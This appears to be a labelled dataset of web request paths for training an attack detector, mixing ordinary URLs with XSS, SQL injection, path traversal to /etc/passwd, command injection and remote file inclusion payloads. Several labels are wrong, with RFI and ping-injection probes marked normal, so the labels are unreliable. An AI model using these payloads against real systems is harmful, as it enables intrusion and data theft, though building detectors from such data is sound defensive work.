label,content
异常,/../.sln
异常,/fc9t54l7.cfm?<script>document.cookie="testggad=2000;"</script>
正常,/108569_missile14/
异常,/scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 1444832703--
正常,/row2_joint/
正常,/burning fat/
正常,/kjerag2004_0099/
正常,/includes/tumbnail.php?config[root_ordner]=http://cirt.net/rfiinc.txt??
正常,/leftcornergrey/
异常,/phpmyadmin/sysinfo.cgi?action=systemdoc&name=sysinfo_name_cmd_exec.nasl;id
正常,/phpmyadmin/index.php?board=nonexistant268220399
异常,/zv8tv7h8.html?<meta http-equiv=set-cookie content="testcqwz=9752">
正常,/gas_average/
正常,/help.php?q=|ping\x0c-w\x0c7000\x0c-n\x0c1\x0c1.2.3.4|rem\x0c
正常,/experience2/modules.php?file=http://192.168.202.96:8080/swgnhpydbq0t?
异常,${shell_exec(print(`echo%20KRLQHL\necho%20$((37%2B53))\necho%20KRLQHL\necho%20KRLQHL`)%3B%2525255C%2525255CKRLQHL
正常,/sld011/
正常,/870273/
正常,/library/freeb/billingservice.class.php
异常,<iframe/name="if(0){\u0061lert(1)}else{\u0061lert(1)}"/onload="eval(name)";> 
正常,/hadleycollectionduckdecoys/
正常,/one piece hk 141 - 145/
异常,%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20KGYKQW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%257C
正常,/docs/api/org/apache/catalina/_vti_inf.html
正常,/reeldealcasinoshufflemastereditionv1/
正常,/pfizer/
正常,/amateurteen-babestripsinthongandfucks/
正常,/190166/
异常,/vjbrrppi.jspa?<script>cross_site_scripting.nasl</script>
正常,/podcastgen1.0beta2/core/admin/pgrssnews.php?absoluteurl=http://192.168.202.96:8080/4dckqcc0acprbz?
正常,/javascript/css.rtf
正常,/102771/
正常,/651141431/
正常,/my chemical romance - photographed by andrew kendall/
异常,"<script>alert(document.head.innerHTML.substr(146,20));</script>"
异常,/examples/jsp/checkbox/index.php?user_langue=../../../../../../../../../../etc/passwd
正常,/examples/jsp/jsp2/jspx/security/login
正常,/oranfecube/
正常,/c07102002_ct358-02/
异常,<base href="javascript:\"> <a href="//%0a%0dconfirm(2);//">XSS</a>
正常,/93218106/
正常,/areaclienti/
异常,/main.php?stuff=;sleep 11 #
正常,/fw_securitylite-1997/
正常,/dl6067/
正常,/discovery channel - supermassive blackholes/
异常,/examples/jsp/num/mrtg.cgi?cfg=/../../../../../../../../../etc/passwd
异常,/phpmyadmin/home?dir=/&file=../../../../../../../../../../../../etc/passwd&lang=kor
异常,%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ERXFFG%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%201%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20
正常,/3869899/
正常,/psionp/
正常,/photocool v1/
正常,/celine/
异常,/hjdzm96v.kspx?<meta http-equiv=set-cookie content="testbyqe=7474">
正常,/598667/
正常,/param_editor.php?folder=http://192.168.202.118:8080/moclyxlwqyfjnp??
异常,%27&&echo$IFSRURCZX$((52%2B67))$(echo$IFSRURCZX)RURCZX&
正常,/tree_surgeon/
正常,/vanessa hudgens - v (with covers) a dhz/
正常,/du_maurier/
正常,/zbrfnbxedft/
正常,/age0int/
正常,/javascript/graphics
正常,/drugoni_dec/
异常,/help.php?q=\x0auname >q49975667 #
正常,/123616/
正常,/hotjobs-16/
异常,/xss_500x214/
异常,/web/submit_comment.php?path_prefix=XXpathXX
异常,/jujgxwav.do?<script>document.cookie="testknim=9383;"</script>
正常,/wp-content/plugins/video-sidebar-widgets/
正常,/system/login.php?site_path=http://192.168.202.118:8080/ghl9il?
异常,/examples/jsp/error?username="<script>foo</script
正常,/administrator/components/com_clickheat/recly/clickheat/clickheat_heatmap.php?globals[mosconfig_absolute_path]=@rfiurl
正常,/q44759549
正常,/lib/classes/swift/mime/headerencoder/qpheaderencoder.php.copy
异常,/using logon scripts figure 51102332855146/
正常,/glb-web/
正常,/dwight yoakam - reprise please baby/
正常,/aliens vs predator - the movie_information/
正常,/schnappi - schnappi und seine freunde for www/
正常,/-wmaker/
正常,/20050907-9/
正常,/alex jones - 911 the road to tyranny/
正常,/bin/qte_init.php?qte_root=http://192.168.202.96:8080/llumt7msyau5y??
正常,/20051212124320/
正常,/20031016-6/
正常,/javascript/entry.cpp
异常,%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20BKAIFJ%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%252F%252F
正常,/pay_button/
异常,%26echo%20RROLAU$((57%2B22))$(echo%20RROLAU)RROLAU"
正常,/sb113918924045565647-olbvfujq9suoi9hft8j2kg1pxoe_20070205/
异常,/examples/servlets/servlet/sendcard.php?view=1&id='sendcard_sql.nasl
正常,/altavista_large/
正常,/dfcode.php?dforum_path=http://192.168.202.96:8080/txenjrxf3??
异常,<div style="font-family:'foo&#10;;color:red;';">LOL
正常,/q49335347
正常,/msg45473/
异常,/main.php?stuff='\x0auname #
异常,/scripts/event_view.php?eid=34 union select 610245698
正常,/120366/
正常,/web/betablockmodules/showannouncementmodule/showannouncementmodule.php?path_prefix=http://192.168.202.118:8080/ghl9il?
正常,/bortgang - live in studio december anno 2002/
异常,/scripts/session/login.php?dest=nessus"><script>alert('ossim_dest_xss.nasl')</script><!-- 
异常,/iv5vkgam.htm?<script>document.cookie="testfosd=94;"</script>
正常,/bch20061201041103/
正常,/mouthwideshut/
异常,/phpmyadmin/cal_make.pl?p0=../../../../../../../../../etc/passwd\x00
正常,/javascript/phps.html
正常,/lamb of god/
正常,/charlie and the chocolate factory 2005/
异常,/javascript/.passwd.zip
正常,/docsis_dccack/
异常,/aktivate/cgi-bin/catgy.cgi?key=0&cartname=axa200135022551089&desc=<script>alert('vulnerable')</script>
正常,/about.php?config[mwchat_libs]=http://192.168.202.96:8080/ipb5ri??
正常,/neotracepro325/
异常,';echo$IFSPICODU$((19%2B82))$(echo$IFSPICODU)PICODU%26
正常,/047020/
异常,/scripts/xuicksry9grj.php3
异常,/bzuf9ozq.cfc?<script>cross_site_scripting.nasl</script>
异常,/a0imiuf1.cfc?<meta http-equiv=set-cookie content="testxqrn=4654">
异常,/vhzmaia2.html?<script>document.cookie="testkogj=3979;"</script>
正常,/159848/
正常,/javascript/~mark.c
正常,/analyze/
正常,/hrmdtemplate_files/
异常,/..\..\..\..\{FILE}
异常,/cgi-bin/publisher/search.cgi?dir=jobs&template=;cat /etc/passwd|&output_number=10
正常,/237378/
正常,/main.php?pagina=http://192.168.202.96:8080/4dckqcc0acprbz?
正常,/xlisoft/
正常,/javascript/crontabs.c
正常,/emaillink3/
正常,/hamilton_win/
正常,/super hits of the seventies vol 22/
正常,/pimpteam/
异常,../../../../../../../../conf/server.xml
正常,/blogad/
正常,/button_5072697661746b756e64656e2d53686f70/
正常,/mcf.php?content=http://192.168.202.118:8080/moclyxlwqyfjnp?
异常,/en-us/oie504mr.kspx?<meta http-equiv=set-cookie content="testtpby=7052">
正常,/previousheadergraphics/
异常,%26%20sleep%200%20%26%26%20str%3D%24%28echo%20TABXYH%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%207%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20
正常,/docs/images/snoopservlet/
正常,/iseries-audit/
正常,/c3c4832d3bc925b5821556cb0db131380b3452d820d0bd28a0613f79a6f49e4a6962f526f9f7c554aeda43122433758fdb5ce6c1ee8f81a5/
正常,/140946/
正常,/127786/
异常,"' aNd 3=MID((@@version,1,1)--+"
异常,/staff attorney job description november 2006/
异常,/odzk29aa.do?<script>document.cookie="testtfvh=2141;"</script>
异常,%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ZEPVFU%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527
正常,/strload.php?langfile=http://192.168.202.96:8080/4dckqcc0acprbz?
正常,/functions.php?pmp_rel_path=http://192.168.202.118:8080/2aibfaczmac8?
正常,/sb116545357153142882-gos3k9stqkusjfq34dvxvy4uvie_20070106/
正常,/classes/query.class.php?basedir=http://192.168.202.96:8080/txenjrxf3?
正常,/629008977/
正常,/007 starr pc & internet monitor v2/
异常,${shell_exec(print(`echo%20NSLPBW`.`echo%20$((95%2B54))`.`echo%20NSLPBW`.`echo%20NSLPBW`)%3B%5C%5CNSLPBW
正常,/promoads/
正常,/redditino2/
正常,/javascript/custom-log.pl
正常,/admin/user_user.php?language=http://192.168.202.96:8080/no4ghqiguzhst?
正常,/mailings/
